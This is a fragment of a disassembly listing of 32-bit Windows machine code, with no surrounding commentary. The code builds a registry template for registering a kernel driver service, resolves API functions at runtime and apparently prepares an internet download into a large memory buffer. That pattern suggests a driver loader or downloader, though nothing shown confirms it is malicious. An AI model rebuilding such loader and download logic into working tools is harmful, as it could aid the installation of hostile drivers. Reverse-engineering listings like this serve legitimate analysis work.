  401750:	88 45 b6             	mov    %al,-0x4a(%ebp)
  401753:	b8 44 00 00 00       	mov    $0x44,%eax
  401758:	88 45 b7             	mov    %al,-0x49(%ebp)
  40175b:	b8 57 00 00 00       	mov    $0x57,%eax
  401760:	88 45 b8             	mov    %al,-0x48(%ebp)
  401763:	b8 4f 00 00 00       	mov    $0x4f,%eax
  401768:	88 45 b9             	mov    %al,-0x47(%ebp)
  40176b:	b8 52 00 00 00       	mov    $0x52,%eax
  401770:	88 45 ba             	mov    %al,-0x46(%ebp)
  401773:	b8 44 00 00 00       	mov    $0x44,%eax
  401778:	88 45 bb             	mov    %al,-0x45(%ebp)
  40177b:	b8 20 00 00 00       	mov    $0x20,%eax
  401780:	88 45 bc             	mov    %al,-0x44(%ebp)
  401783:	b8 31 00 00 00       	mov    $0x31,%eax
  401788:	88 45 bd             	mov    %al,-0x43(%ebp)
  40178b:	b8 0d 00 00 00       	mov    $0xd,%eax
  401790:	88 45 be             	mov    %al,-0x42(%ebp)
  401793:	b8 0a 00 00 00       	mov    $0xa,%eax
  401798:	88 45 bf             	mov    %al,-0x41(%ebp)
  40179b:	b8 22 00 00 00       	mov    $0x22,%eax
  4017a0:	88 45 c0             	mov    %al,-0x40(%ebp)
  4017a3:	b8 49 00 00 00       	mov    $0x49,%eax
  4017a8:	88 45 c1             	mov    %al,-0x3f(%ebp)
  4017ab:	b8 6d 00 00 00       	mov    $0x6d,%eax
  4017b0:	88 45 c2             	mov    %al,-0x3e(%ebp)
  4017b3:	b8 61 00 00 00       	mov    $0x61,%eax
  4017b8:	88 45 c3             	mov    %al,-0x3d(%ebp)
  4017bb:	b8 67 00 00 00       	mov    $0x67,%eax
  4017c0:	88 45 c4             	mov    %al,-0x3c(%ebp)
  4017c3:	b8 65 00 00 00       	mov    $0x65,%eax
  4017c8:	88 45 c5             	mov    %al,-0x3b(%ebp)
  4017cb:	b8 50 00 00 00       	mov    $0x50,%eax
  4017d0:	88 45 c6             	mov    %al,-0x3a(%ebp)
  4017d3:	b8 61 00 00 00       	mov    $0x61,%eax
  4017d8:	88 45 c7             	mov    %al,-0x39(%ebp)
  4017db:	b8 74 00 00 00       	mov    $0x74,%eax
  4017e0:	88 45 c8             	mov    %al,-0x38(%ebp)
  4017e3:	b8 68 00 00 00       	mov    $0x68,%eax
  4017e8:	88 45 c9             	mov    %al,-0x37(%ebp)
  4017eb:	b8 22 00 00 00       	mov    $0x22,%eax
  4017f0:	88 45 ca             	mov    %al,-0x36(%ebp)
  4017f3:	b8 20 00 00 00       	mov    $0x20,%eax
  4017f8:	88 45 cb             	mov    %al,-0x35(%ebp)
  4017fb:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401800:	88 45 cc             	mov    %al,-0x34(%ebp)
  401803:	b8 20 00 00 00       	mov    $0x20,%eax
  401808:	88 45 cd             	mov    %al,-0x33(%ebp)
  40180b:	b8 5c 00 00 00       	mov    $0x5c,%eax
  401810:	88 45 ce             	mov    %al,-0x32(%ebp)
  401813:	b8 3f 00 00 00       	mov    $0x3f,%eax
  401818:	88 45 cf             	mov    %al,-0x31(%ebp)
  40181b:	b8 3f 00 00 00       	mov    $0x3f,%eax
  401820:	88 45 d0             	mov    %al,-0x30(%ebp)
  401823:	b8 5c 00 00 00       	mov    $0x5c,%eax
  401828:	88 45 d1             	mov    %al,-0x2f(%ebp)
  40182b:	b8 25 00 00 00       	mov    $0x25,%eax
  401830:	88 45 d2             	mov    %al,-0x2e(%ebp)
  401833:	b8 73 00 00 00       	mov    $0x73,%eax
  401838:	88 45 d3             	mov    %al,-0x2d(%ebp)
  40183b:	b8 0d 00 00 00       	mov    $0xd,%eax
  401840:	88 45 d4             	mov    %al,-0x2c(%ebp)
  401843:	b8 0a 00 00 00       	mov    $0xa,%eax
  401848:	88 45 d5             	mov    %al,-0x2b(%ebp)
  40184b:	b8 53 00 00 00       	mov    $0x53,%eax
  401850:	88 45 d6             	mov    %al,-0x2a(%ebp)
  401853:	b8 74 00 00 00       	mov    $0x74,%eax
  401858:	88 45 d7             	mov    %al,-0x29(%ebp)
  40185b:	b8 61 00 00 00       	mov    $0x61,%eax
  401860:	88 45 d8             	mov    %al,-0x28(%ebp)
  401863:	b8 72 00 00 00       	mov    $0x72,%eax
  401868:	88 45 d9             	mov    %al,-0x27(%ebp)
  40186b:	b8 74 00 00 00       	mov    $0x74,%eax
  401870:	88 45 da             	mov    %al,-0x26(%ebp)
  401873:	b8 20 00 00 00       	mov    $0x20,%eax
  401878:	88 45 db             	mov    %al,-0x25(%ebp)
  40187b:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401880:	88 45 dc             	mov    %al,-0x24(%ebp)
  401883:	b8 20 00 00 00       	mov    $0x20,%eax
  401888:	88 45 dd             	mov    %al,-0x23(%ebp)
  40188b:	b8 52 00 00 00       	mov    $0x52,%eax
  401890:	88 45 de             	mov    %al,-0x22(%ebp)
  401893:	b8 45 00 00 00       	mov    $0x45,%eax
  401898:	88 45 df             	mov    %al,-0x21(%ebp)
  40189b:	b8 47 00 00 00       	mov    $0x47,%eax
  4018a0:	88 45 e0             	mov    %al,-0x20(%ebp)
  4018a3:	b8 5f 00 00 00       	mov    $0x5f,%eax
  4018a8:	88 45 e1             	mov    %al,-0x1f(%ebp)
  4018ab:	b8 44 00 00 00       	mov    $0x44,%eax
  4018b0:	88 45 e2             	mov    %al,-0x1e(%ebp)
  4018b3:	b8 57 00 00 00       	mov    $0x57,%eax
  4018b8:	88 45 e3             	mov    %al,-0x1d(%ebp)
  4018bb:	b8 4f 00 00 00       	mov    $0x4f,%eax
  4018c0:	88 45 e4             	mov    %al,-0x1c(%ebp)
  4018c3:	b8 52 00 00 00       	mov    $0x52,%eax
  4018c8:	88 45 e5             	mov    %al,-0x1b(%ebp)
  4018cb:	b8 44 00 00 00       	mov    $0x44,%eax
  4018d0:	88 45 e6             	mov    %al,-0x1a(%ebp)
  4018d3:	b8 20 00 00 00       	mov    $0x20,%eax
  4018d8:	88 45 e7             	mov    %al,-0x19(%ebp)
  4018db:	b8 33 00 00 00       	mov    $0x33,%eax
  4018e0:	88 45 e8             	mov    %al,-0x18(%ebp)
  4018e3:	b8 0d 00 00 00       	mov    $0xd,%eax
  4018e8:	88 45 e9             	mov    %al,-0x17(%ebp)
  4018eb:	b8 0a 00 00 00       	mov    $0xa,%eax
  4018f0:	88 45 ea             	mov    %al,-0x16(%ebp)
  4018f3:	b8 54 00 00 00       	mov    $0x54,%eax
  4018f8:	88 45 eb             	mov    %al,-0x15(%ebp)
  4018fb:	b8 79 00 00 00       	mov    $0x79,%eax
  401900:	88 45 ec             	mov    %al,-0x14(%ebp)
  401903:	b8 70 00 00 00       	mov    $0x70,%eax
  401908:	88 45 ed             	mov    %al,-0x13(%ebp)
  40190b:	b8 65 00 00 00       	mov    $0x65,%eax
  401910:	88 45 ee             	mov    %al,-0x12(%ebp)
  401913:	b8 20 00 00 00       	mov    $0x20,%eax
  401918:	88 45 ef             	mov    %al,-0x11(%ebp)
  40191b:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401920:	88 45 f0             	mov    %al,-0x10(%ebp)
  401923:	b8 20 00 00 00       	mov    $0x20,%eax
  401928:	88 45 f1             	mov    %al,-0xf(%ebp)
  40192b:	b8 52 00 00 00       	mov    $0x52,%eax
  401930:	88 45 f2             	mov    %al,-0xe(%ebp)
  401933:	b8 45 00 00 00       	mov    $0x45,%eax
  401938:	88 45 f3             	mov    %al,-0xd(%ebp)
  40193b:	b8 47 00 00 00       	mov    $0x47,%eax
  401940:	88 45 f4             	mov    %al,-0xc(%ebp)
  401943:	b8 5f 00 00 00       	mov    $0x5f,%eax
  401948:	88 45 f5             	mov    %al,-0xb(%ebp)
  40194b:	b8 44 00 00 00       	mov    $0x44,%eax
  401950:	88 45 f6             	mov    %al,-0xa(%ebp)
  401953:	b8 57 00 00 00       	mov    $0x57,%eax
  401958:	88 45 f7             	mov    %al,-0x9(%ebp)
  40195b:	b8 4f 00 00 00       	mov    $0x4f,%eax
  401960:	88 45 f8             	mov    %al,-0x8(%ebp)
  401963:	b8 52 00 00 00       	mov    $0x52,%eax
  401968:	88 45 f9             	mov    %al,-0x7(%ebp)
  40196b:	b8 44 00 00 00       	mov    $0x44,%eax
  401970:	88 45 fa             	mov    %al,-0x6(%ebp)
  401973:	b8 20 00 00 00       	mov    $0x20,%eax
  401978:	88 45 fb             	mov    %al,-0x5(%ebp)
  40197b:	b8 31 00 00 00       	mov    $0x31,%eax
  401980:	88 45 fc             	mov    %al,-0x4(%ebp)
  401983:	b8 0d 00 00 00       	mov    $0xd,%eax
  401988:	88 45 fd             	mov    %al,-0x3(%ebp)
  40198b:	b8 0a 00 00 00       	mov    $0xa,%eax
  401990:	88 45 fe             	mov    %al,-0x2(%ebp)
  401993:	b8 00 00 00 00       	mov    $0x0,%eax
  401998:	88 45 ff             	mov    %al,-0x1(%ebp)
  40199b:	b8 00 00 00 00       	mov    $0x0,%eax
  4019a0:	88 85 6d fb ff ff    	mov    %al,-0x493(%ebp)
  4019a6:	b8 ff 03 00 00       	mov    $0x3ff,%eax
  4019ab:	50                   	push   %eax
  4019ac:	b8 00 00 00 00       	mov    $0x0,%eax
  4019b1:	50                   	push   %eax
  4019b2:	8d 85 6e fb ff ff    	lea    -0x492(%ebp),%eax
  4019b8:	50                   	push   %eax
  4019b9:	e8 aa 0f 00 00       	call   0x402968
  4019be:	83 c4 0c             	add    $0xc,%esp
  4019c1:	b8 e8 03 00 00       	mov    $0x3e8,%eax
  4019c6:	89 85 68 fb ff ff    	mov    %eax,-0x498(%ebp)
  4019cc:	b8 bc 30 40 00       	mov    $0x4030bc,%eax
  4019d1:	50                   	push   %eax
  4019d2:	e8 81 0f 00 00       	call   0x402958
  4019d7:	b9 c7 30 40 00       	mov    $0x4030c7,%ecx
  4019dc:	51                   	push   %ecx
  4019dd:	50                   	push   %eax
  4019de:	e8 7d 0f 00 00       	call   0x402960
  4019e3:	89 85 64 fb ff ff    	mov    %eax,-0x49c(%ebp)
  4019e9:	8b 45 10             	mov    0x10(%ebp),%eax
  4019ec:	50                   	push   %eax
  4019ed:	8b 45 08             	mov    0x8(%ebp),%eax
  4019f0:	50                   	push   %eax
  4019f1:	e8 27 f8 ff ff       	call   0x40121d
  4019f6:	83 c4 08             	add    $0x8,%esp
  4019f9:	83 f8 00             	cmp    $0x0,%eax
  4019fc:	0f 85 67 00 00 00    	jne    0x401a69
  401a02:	8b 45 10             	mov    0x10(%ebp),%eax
  401a05:	50                   	push   %eax
  401a06:	8b 45 0c             	mov    0xc(%ebp),%eax
  401a09:	50                   	push   %eax
  401a0a:	8b 45 0c             	mov    0xc(%ebp),%eax
  401a0d:	50                   	push   %eax
  401a0e:	8d 85 6d ff ff ff    	lea    -0x93(%ebp),%eax
  401a14:	50                   	push   %eax
  401a15:	8d 85 6d fb ff ff    	lea    -0x493(%ebp),%eax
  401a1b:	50                   	push   %eax
  401a1c:	8b 85 64 fb ff ff    	mov    -0x49c(%ebp),%eax
  401a22:	ff d0                	call   *%eax
  401a24:	8b 85 68 fb ff ff    	mov    -0x498(%ebp),%eax
  401a2a:	50                   	push   %eax
  401a2b:	e8 90 0f 00 00       	call   0x4029c0
  401a30:	8d 85 6d fb ff ff    	lea    -0x493(%ebp),%eax
  401a36:	50                   	push   %eax
  401a37:	b8 d1 30 40 00       	mov    $0x4030d1,%eax
  401a3c:	50                   	push   %eax
  401a3d:	e8 9c f6 ff ff       	call   0x4010de
  401a42:	83 c4 08             	add    $0x8,%esp
  401a45:	b8 60 ea 00 00       	mov    $0xea60,%eax
  401a4a:	89 85 68 fb ff ff    	mov    %eax,-0x498(%ebp)
  401a50:	8b 45 10             	mov    0x10(%ebp),%eax
  401a53:	50                   	push   %eax
  401a54:	8b 45 08             	mov    0x8(%ebp),%eax
  401a57:	50                   	push   %eax
  401a58:	e8 c0 f7 ff ff       	call   0x40121d
  401a5d:	83 c4 08             	add    $0x8,%esp
  401a60:	83 f8 00             	cmp    $0x0,%eax
  401a63:	0f 84 bb ff ff ff    	je     0x401a24
  401a69:	b8 d8 30 40 00       	mov    $0x4030d8,%eax
  401a6e:	50                   	push   %eax
  401a6f:	e8 54 0f 00 00       	call   0x4029c8
  401a74:	c9                   	leave
  401a75:	c3                   	ret
  401a76:	55                   	push   %ebp
  401a77:	89 e5                	mov    %esp,%ebp
  401a79:	81 ec 00 00 00 00    	sub    $0x0,%esp
  401a7f:	90                   	nop
  401a80:	e8 4b 0f 00 00       	call   0x4029d0
  401a85:	b9 00 00 00 00       	mov    $0x0,%ecx
  401a8a:	51                   	push   %ecx
  401a8b:	50                   	push   %eax
  401a8c:	e8 47 0f 00 00       	call   0x4029d8
  401a91:	b8 00 00 00 00       	mov    $0x0,%eax
  401a96:	e9 00 00 00 00       	jmp    0x401a9b
  401a9b:	c9                   	leave
  401a9c:	c2 04 00             	ret    $0x4
  401a9f:	55                   	push   %ebp
  401aa0:	89 e5                	mov    %esp,%ebp
  401aa2:	81 ec 04 00 00 00    	sub    $0x4,%esp
  401aa8:	90                   	nop
  401aa9:	b8 00 00 00 00       	mov    $0x0,%eax
  401aae:	50                   	push   %eax
  401aaf:	b8 80 00 00 00       	mov    $0x80,%eax
  401ab4:	50                   	push   %eax
  401ab5:	b8 03 00 00 00       	mov    $0x3,%eax
  401aba:	50                   	push   %eax
  401abb:	b8 00 00 00 00       	mov    $0x0,%eax
  401ac0:	50                   	push   %eax
  401ac1:	b8 03 00 00 00       	mov    $0x3,%eax
  401ac6:	50                   	push   %eax
  401ac7:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  401acc:	50                   	push   %eax
  401acd:	b8 df 30 40 00       	mov    $0x4030df,%eax
  401ad2:	50                   	push   %eax
  401ad3:	e8 a0 0e 00 00       	call   0x402978
  401ad8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401adb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401ade:	83 f8 ff             	cmp    $0xffffffff,%eax
  401ae1:	0f 84 13 00 00 00    	je     0x401afa
  401ae7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401aea:	50                   	push   %eax
  401aeb:	e8 a0 0e 00 00       	call   0x402990
  401af0:	b8 01 00 00 00       	mov    $0x1,%eax
  401af5:	e9 0a 00 00 00       	jmp    0x401b04
  401afa:	b8 00 00 00 00       	mov    $0x0,%eax
  401aff:	e9 00 00 00 00       	jmp    0x401b04
  401b04:	c9                   	leave
  401b05:	c3                   	ret
  401b06:	55                   	push   %ebp
  401b07:	89 e5                	mov    %esp,%ebp
  401b09:	81 ec 04 00 00 00    	sub    $0x4,%esp
  401b0f:	90                   	nop
  401b10:	b8 00 00 00 00       	mov    $0x0,%eax
  401b15:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b18:	39 c8                	cmp    %ecx,%eax
  401b1a:	0f 85 05 00 00 00    	jne    0x401b25
  401b20:	e9 33 00 00 00       	jmp    0x401b58
  401b25:	b8 ed 30 40 00       	mov    $0x4030ed,%eax
  401b2a:	50                   	push   %eax
  401b2b:	e8 b0 0e 00 00       	call   0x4029e0
  401b30:	b9 f6 30 40 00       	mov    $0x4030f6,%ecx
  401b35:	51                   	push   %ecx
  401b36:	50                   	push   %eax
  401b37:	e8 24 0e 00 00       	call   0x402960
  401b3c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b3f:	b8 00 00 00 00       	mov    $0x0,%eax
  401b44:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b47:	39 c8                	cmp    %ecx,%eax
  401b49:	0f 84 09 00 00 00    	je     0x401b58
  401b4f:	8b 45 08             	mov    0x8(%ebp),%eax
  401b52:	50                   	push   %eax
  401b53:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401b56:	ff d0                	call   *%eax
  401b58:	c9                   	leave
  401b59:	c3                   	ret
  401b5a:	55                   	push   %ebp
  401b5b:	89 e5                	mov    %esp,%ebp
  401b5d:	81 ec 28 00 00 00    	sub    $0x28,%esp
  401b63:	90                   	nop
  401b64:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401b67:	50                   	push   %eax
  401b68:	e8 99 ff ff ff       	call   0x401b06
  401b6d:	83 c4 04             	add    $0x4,%esp
  401b70:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401b73:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401b76:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401b79:	0f b7 08             	movzwl (%eax),%ecx
  401b7c:	83 f9 09             	cmp    $0x9,%ecx
  401b7f:	0f 84 14 00 00 00    	je     0x401b99
  401b85:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401b88:	0f b7 08             	movzwl (%eax),%ecx
  401b8b:	83 f9 06             	cmp    $0x6,%ecx
  401b8e:	0f 84 05 00 00 00    	je     0x401b99
  401b94:	e9 0a 00 00 00       	jmp    0x401ba3
  401b99:	b8 40 00 00 00       	mov    $0x40,%eax
  401b9e:	e9 0a 00 00 00       	jmp    0x401bad
  401ba3:	b8 20 00 00 00       	mov    $0x20,%eax
  401ba8:	e9 00 00 00 00       	jmp    0x401bad
  401bad:	c9                   	leave
  401bae:	c3                   	ret
  401baf:	55                   	push   %ebp
  401bb0:	89 e5                	mov    %esp,%ebp
  401bb2:	81 ec 04 00 00 00    	sub    $0x4,%esp
  401bb8:	90                   	nop
  401bb9:	b8 00 00 00 00       	mov    $0x0,%eax
  401bbe:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401bc1:	8b 45 08             	mov    0x8(%ebp),%eax
  401bc4:	0f be 08             	movsbl (%eax),%ecx
  401bc7:	83 f9 00             	cmp    $0x0,%ecx
  401bca:	0f 84 22 00 00 00    	je     0x401bf2
  401bd0:	8b 45 08             	mov    0x8(%ebp),%eax
  401bd3:	0f be 08             	movsbl (%eax),%ecx
  401bd6:	83 f9 5c             	cmp    $0x5c,%ecx
  401bd9:	0f 85 06 00 00 00    	jne    0x401be5
  401bdf:	8b 45 08             	mov    0x8(%ebp),%eax
  401be2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401be5:	8b 45 08             	mov    0x8(%ebp),%eax
  401be8:	89 c1                	mov    %eax,%ecx
  401bea:	83 c0 01             	add    $0x1,%eax
  401bed:	89 45 08             	mov    %eax,0x8(%ebp)
  401bf0:	eb cf                	jmp    0x401bc1
  401bf2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401bf5:	83 f8 00             	cmp    $0x0,%eax
  401bf8:	0f 84 0a 00 00 00    	je     0x401c08
  401bfe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401c01:	b9 00 00 00 00       	mov    $0x0,%ecx
  401c06:	88 08                	mov    %cl,(%eax)
  401c08:	c9                   	leave
  401c09:	c3                   	ret
  401c0a:	55                   	push   %ebp
  401c0b:	89 e5                	mov    %esp,%ebp
  401c0d:	81 ec 88 0a 00 00    	sub    $0xa88,%esp
  401c13:	90                   	nop
  401c14:	b8 00 00 00 00       	mov    $0x0,%eax
  401c19:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401c1c:	b8 00 00 00 00       	mov    $0x0,%eax
  401c21:	88 85 dc fe ff ff    	mov    %al,-0x124(%ebp)
  401c27:	b8 ff 00 00 00       	mov    $0xff,%eax
  401c2c:	50                   	push   %eax
  401c2d:	b8 00 00 00 00       	mov    $0x0,%eax
  401c32:	50                   	push   %eax
  401c33:	8d 85 dd fe ff ff    	lea    -0x123(%ebp),%eax
  401c39:	50                   	push   %eax
  401c3a:	e8 29 0d 00 00       	call   0x402968
  401c3f:	83 c4 0c             	add    $0xc,%esp
  401c42:	b8 00 00 00 00       	mov    $0x0,%eax
  401c47:	88 85 dc fd ff ff    	mov    %al,-0x224(%ebp)
  401c4d:	b8 ff 00 00 00       	mov    $0xff,%eax
  401c52:	50                   	push   %eax
  401c53:	b8 00 00 00 00       	mov    $0x0,%eax
  401c58:	50                   	push   %eax
  401c59:	8d 85 dd fd ff ff    	lea    -0x223(%ebp),%eax
  401c5f:	50                   	push   %eax
  401c60:	e8 03 0d 00 00       	call   0x402968
  401c65:	83 c4 0c             	add    $0xc,%esp
  401c68:	b8 00 00 50 00       	mov    $0x500000,%eax
  401c6d:	50                   	push   %eax
  401c6e:	e8 35 0d 00 00       	call   0x4029a8
  401c73:	83 c4 04             	add    $0x4,%esp
  401c76:	89 85 d8 fd ff ff    	mov    %eax,-0x228(%ebp)
  401c7c:	8b 85 d8 fd ff ff    	mov    -0x228(%ebp),%eax
  401c82:	89 85 d4 fd ff ff    	mov    %eax,-0x22c(%ebp)
  401c88:	b8 00 00 50 00       	mov    $0x500000,%eax
  401c8d:	50                   	push   %eax
  401c8e:	b8 00 00 00 00       	mov    $0x0,%eax
  401c93:	50                   	push   %eax
  401c94:	8b 85 d8 fd ff ff    	mov    -0x228(%ebp),%eax
  401c9a:	50                   	push   %eax
  401c9b:	e8 c8 0c 00 00       	call   0x402968
  401ca0:	83 c4 0c             	add    $0xc,%esp
  401ca3:	8b 45 0c             	mov    0xc(%ebp),%eax
  401ca6:	8b 8d d8 fd ff ff    	mov    -0x228(%ebp),%ecx
  401cac:	89 08                	mov    %ecx,(%eax)
  401cae:	b8 3c 00 00 00       	mov    $0x3c,%eax
  401cb3:	50                   	push   %eax
  401cb4:	b8 00 00 00 00       	mov    $0x0,%eax
  401cb9:	50                   	push   %eax
  401cba:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401cc0:	50                   	push   %eax
  401cc1:	e8 a2 0c 00 00       	call   0x402968
  401cc6:	83 c4 0c             	add    $0xc,%esp
  401cc9:	b8 3c 00 00 00       	mov    $0x3c,%eax
  401cce:	89 85 98 fd ff ff    	mov    %eax,-0x268(%ebp)
  401cd4:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401cda:	83 c0 10             	add    $0x10,%eax
  401cdd:	8d 8d dc fe ff ff    	lea    -0x124(%ebp),%ecx
  401ce3:	89 08                	mov    %ecx,(%eax)
  401ce5:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401ceb:	83 c0 14             	add    $0x14,%eax
  401cee:	b9 00 01 00 00       	mov    $0x100,%ecx
  401cf3:	89 08                	mov    %ecx,(%eax)
  401cf5:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401cfb:	83 c0 2c             	add    $0x2c,%eax
  401cfe:	8d 8d dc fd ff ff    	lea    -0x224(%ebp),%ecx
  401d04:	89 08                	mov    %ecx,(%eax)
  401d06:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401d0c:	83 c0 30             	add    $0x30,%eax
  401d0f:	b9 00 01 00 00       	mov    $0x100,%ecx
  401d14:	89 08                	mov    %ecx,(%eax)
  401d16:	b8 0a 31 40 00       	mov    $0x40310a,%eax
  401d1b:	50                   	push   %eax
  401d1c:	e8 37 0c 00 00       	call   0x402958
  401d21:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  401d27:	b8 16 31 40 00       	mov    $0x403116,%eax
  401d2c:	50                   	push   %eax
  401d2d:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d33:	50                   	push   %eax
  401d34:	e8 27 0c 00 00       	call   0x402960
  401d39:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401d3c:	b8 28 31 40 00       	mov    $0x403128,%eax
  401d41:	50                   	push   %eax
  401d42:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d48:	50                   	push   %eax
  401d49:	e8 12 0c 00 00       	call   0x402960
  401d4e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401d51:	b8 36 31 40 00       	mov    $0x403136,%eax
  401d56:	50                   	push   %eax
  401d57:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d5d:	50                   	push   %eax
  401d5e:	e8 fd 0b 00 00       	call   0x402960
  401d63:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401d66:	b8 47 31 40 00       	mov    $0x403147,%eax
  401d6b:	50                   	push   %eax
  401d6c:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d72:	50                   	push   %eax
  401d73:	e8 e8 0b 00 00       	call   0x402960
  401d78:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401d7b:	b8 58 31 40 00       	mov    $0x403158,%eax
  401d80:	50                   	push   %eax
  401d81:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d87:	50                   	push   %eax
  401d88:	e8 d3 0b 00 00       	call   0x402960
  401d8d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401d90:	b8 69 31 40 00       	mov    $0x403169,%eax
  401d95:	50                   	push   %eax
  401d96:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d9c:	50                   	push   %eax
  401d9d:	e8 be 0b 00 00       	call   0x402960
  401da2:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401da5:	b8 7a 31 40 00       	mov    $0x40317a,%eax
  401daa:	50                   	push   %eax
  401dab:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401db1:	50                   	push   %eax
  401db2:	e8 a9 0b 00 00       	call   0x402960
  401db7:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401dba:	b8 8e 31 40 00       	mov    $0x40318e,%eax
  401dbf:	50                   	push   %eax
  401dc0:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401dc6:	50                   	push   %eax
  401dc7:	e8 94 0b 00 00       	call   0x402960
  401dcc:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401dcf:	8b 45 08             	mov    0x8(%ebp),%eax
  401dd2:	50                   	push   %eax
  401dd3:	e8 a8 0b 00 00       	call   0x402980
  401dd8:	83 c4 04             	add    $0x4,%esp
  401ddb:	8d 8d 98 fd ff ff    	lea    -0x268(%ebp),%ecx
  401de1:	51                   	push   %ecx
  401de2:	b9 00 00 00 00       	mov    $0x0,%ecx
  401de7:	51                   	push   %ecx
  401de8:	50                   	push   %eax
  401de9:	8b 45 08             	mov    0x8(%ebp),%eax
  401dec:	50                   	push   %eax
  401ded:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401df0:	ff d0                	call   *%eax
  401df2:	85 c0                	test   %eax,%eax
  401df4:	0f 84 05 00 00 00    	je     0x401dff
  401dfa:	e9 08 00 00 00       	jmp    0x401e07
  401dff:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401e02:	e9 a1 03 00 00       	jmp    0x4021a8
  401e07:	b8 00 00 00 00       	mov    $0x0,%eax
  401e0c:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  401e12:	b8 00 00 00 00       	mov    $0x0,%eax
  401e17:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  401e1d:	b8 00 00 00 00       	mov    $0x0,%eax
  401e22:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  401e28:	b8 00 00 00 00       	mov    $0x0,%eax
  401e2d:	89 85 84 fd ff ff    	mov    %eax,-0x27c(%ebp)
  401e33:	b8 04 00 00 00       	mov    $0x4,%eax
  401e38:	89 85 80 fd ff ff    	mov    %eax,-0x280(%ebp)
  401e3e:	b8 00 00 00 00       	mov    $0x0,%eax
  401e43:	88 85 7f f5 ff ff    	mov    %al,-0xa81(%ebp)
  401e49:	b8 00 08 00 00       	mov    $0x800,%eax
  401e4e:	50                   	push   %eax
  401e4f:	b8 00 00 00 00       	mov    $0x0,%eax
  401e54:	50                   	push   %eax
  401e55:	8d 85 80 f5 ff ff    	lea    -0xa80(%ebp),%eax
  401e5b:	50                   	push   %eax
  401e5c:	e8 07 0b 00 00       	call   0x402968
  401e61:	83 c4 0c             	add    $0xc,%esp
  401e64:	b8 00 00 00 00       	mov    $0x0,%eax
  401e69:	50                   	push   %eax
  401e6a:	b8 00 00 00 00       	mov    $0x0,%eax
  401e6f:	50                   	push   %eax
  401e70:	b8 00 00 00 00       	mov    $0x0,%eax
  401e75:	50                   	push   %eax
  401e76:	b8 00 00 00 00       	mov    $0x0,%eax
  401e7b:	50                   	push   %eax
  401e7c:	b8 9d 31 40 00       	mov    $0x40319d,%eax
  401e81:	50                   	push   %eax
  401e82:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401e85:	ff d0                	call   *%eax
  401e87:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  401e8d:	8b 85 90 fd ff ff    	mov    -0x270(%ebp),%eax
  401e93:	85 c0                	test   %eax,%eax
  401e95:	0f 84 05 00 00 00    	je     0x401ea0
  401e9b:	e9 05 00 00 00       	jmp    0x401ea5
  401ea0:	e9 ad 02 00 00       	jmp    0x402152
  401ea5:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401eab:	83 c0 10             	add    $0x10,%eax
  401eae:	8d 8d 98 fd ff ff    	lea    -0x268(%ebp),%ecx
  401eb4:	83 c1 18             	add    $0x18,%ecx
  401eb7:	ba 00 00 00 00       	mov    $0x0,%edx
  401ebc:	52                   	push   %edx
  401ebd:	ba 00 00 00 00       	mov    $0x0,%edx
  401ec2:	52                   	push   %edx
  401ec3:	ba 03 00 00 00       	mov    $0x3,%edx
  401ec8:	52                   	push   %edx
  401ec9:	ba 00 00 00 00       	mov    $0x0,%edx
  401ece:	52                   	push   %edx
  401ecf:	ba 00 00 00 00       	mov    $0x0,%edx
  401ed4:	52                   	push   %edx
  401ed5:	0f b7 11             	movzwl (%ecx),%edx
  401ed8:	52                   	push   %edx
  401ed9:	8b 08                	mov    (%eax),%ecx
  401edb:	51                   	push   %ecx
  401edc:	8b 85 90 fd ff ff    	mov    -0x270(%ebp),%eax
  401ee2:	50                   	push   %eax
  401ee3:	8b 45 f4             	mov    -0xc(%ebp),%eax
